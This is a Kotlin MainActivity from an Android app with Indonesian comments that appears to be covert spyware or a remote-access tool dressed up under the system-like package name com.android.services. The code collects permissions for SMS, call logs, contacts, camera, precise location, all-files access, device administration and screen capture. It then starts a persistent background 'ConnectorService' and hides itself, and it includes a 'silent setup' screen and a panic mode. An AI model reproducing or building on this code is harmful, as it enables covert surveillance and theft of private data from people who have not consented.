package com.android.services

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.view.View
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.android.services.databinding.ActivityMainBinding
import com.google.firebase.crashlytics.FirebaseCrashlytics
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }
    private val crashlytics by lazy { FirebaseCrashlytics.getInstance() }

    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }

    private val RUNTIME_PERMISSIONS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_PHONE_STATE,
    )

    // MediaProjection permission launcher
    private lateinit var projectionLauncher: ActivityResultLauncher<Intent>

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        crashlytics.log("MainActivity: onCreate")

        ensureDeviceId()
        startConnectorService()

        // Register MediaProjection result launcher
        projectionLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_OK && result.data != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    // Android 14+ (API 34): wajib via foreground service dengan tipe mediaProjection
                    try {
                        val svcIntent = Intent(this, ConnectorService::class.java).apply {
                            action = ConnectorService.ACTION_SETUP_MEDIA_PROJECTION
                            putExtra(ConnectorService.EXTRA_MP_RESULT_CODE, result.resultCode)
                            putExtra(ConnectorService.EXTRA_MP_DATA, result.data)
                        }
                        startForegroundService(svcIntent)
                    } catch (e: Exception) {
                        crashlytics.recordException(e)
                        android.util.Log.w("MainActivity", "MP service intent failed: ${e.message}")
                    }
                } else {
                    // Android ≤ 13: panggil langsung dari Activity
                    try {
                        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                        val proj = mgr.getMediaProjection(result.resultCode, result.data!!)
                        MediaProjectionHolder.setup(applicationContext, proj, resources.displayMetrics)
                    } catch (e: Exception) {
                        crashlytics.recordException(e)
                        android.util.Log.w("MainActivity", "MP setup failed: ${e.message}")
                    }
                }
            }
            hideAndExit()
        }

        val fromPanic = intent.getBooleanExtra("PANIC_MODE", false)

        binding.btnAccessibility.setOnClickListener {
            startActivity(Intent(this, SilentSetupActivity::class.java))
        }

        binding.btnLaunch.setOnClickListener {
            hideAndExit()
        }

        updateUI(fromPanic)
    }

    override fun onResume() {
        super.onResume()
        updateUI(intent.getBooleanExtra("PANIC_MODE", false))
    }

    private fun updateUI(fromPanic: Boolean) {
        val allPermsOk = allPermissionsGranted()
        val adminOk = dpm.isAdminActive(adminComponent)
        val setupDone = allPermsOk && adminOk

        crashlytics.log("MainActivity: updateUI allPermsOk=$allPermsOk adminOk=$adminOk setupDone=$setupDone fromPanic=$fromPanic")

        if (setupDone && !fromPanic) {
            // Semua izin OK — minta MediaProjection dulu jika belum aktif, lalu hide
            if (!MediaProjectionHolder.isAvailable()) {
                requestMediaProjection()
            } else {
                hideAndExit()
            }
            return
        }

        if (setupDone) {
            // Panic mode — semua sudah ok, tampilkan tombol sembunyikan
            binding.tvAccessStatus.text = "✅  Semua izin aktif"
            binding.tvAccessStatus.setTextColor(getColor(R.color.green))
            binding.btnAccessibility.visibility = View.GONE
            binding.btnLaunch.visibility = View.VISIBLE
        } else {
            // Belum semua izin diberikan
            val missing = mutableListOf<String>()
            if (!allPermsOk) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) missing.add("Lokasi")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) missing.add("SMS")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) missing.add("Log Panggilan")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) missing.add("Kontak")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) missing.add("Kamera")
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) missing.add("Akses File")
            }
            if (!adminOk) missing.add("Admin Perangkat")

            crashlytics.log("MainActivity: missing permissions = ${missing.joinToString()}")
            binding.tvAccessStatus.text = "Izin belum diberikan:\n• ${missing.joinToString("\n• ")}\n\nKetuk tombol untuk berikan izin satu per satu."
            binding.tvAccessStatus.setTextColor(getColor(R.color.red))
            binding.btnAccessibility.text = "Berikan Izin →"
            binding.btnAccessibility.visibility = View.VISIBLE
            binding.btnLaunch.visibility = View.GONE
        }
    }

    /**
     * Tampilkan system dialog untuk MediaProjection (screen capture) permission.
     */
    private fun requestMediaProjection() {
        try {
            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            projectionLauncher.launch(mgr.createScreenCaptureIntent())
        } catch (e: Exception) {
            crashlytics.recordException(e)
            android.util.Log.w("MainActivity", "requestMediaProjection failed: ${e.message}")
            hideAndExit()
        }
    }

    private fun allPermissionsGranted(): Boolean {
        val runtimeOk = RUNTIME_PERMISSIONS.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else true
        return runtimeOk && storageOk
    }

    private fun hideAndExit() {
        startConnectorService()
        finish()
    }

    private fun ensureDeviceId() {
        if (prefs.getString("device_id", null) == null) {
            prefs.edit().putString("device_id", UUID.randomUUID().toString()).apply()
        }
    }

    private fun startConnectorService() {
        val intent = Intent(this, ConnectorService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            crashlytics.recordException(e)
        }
    }
}
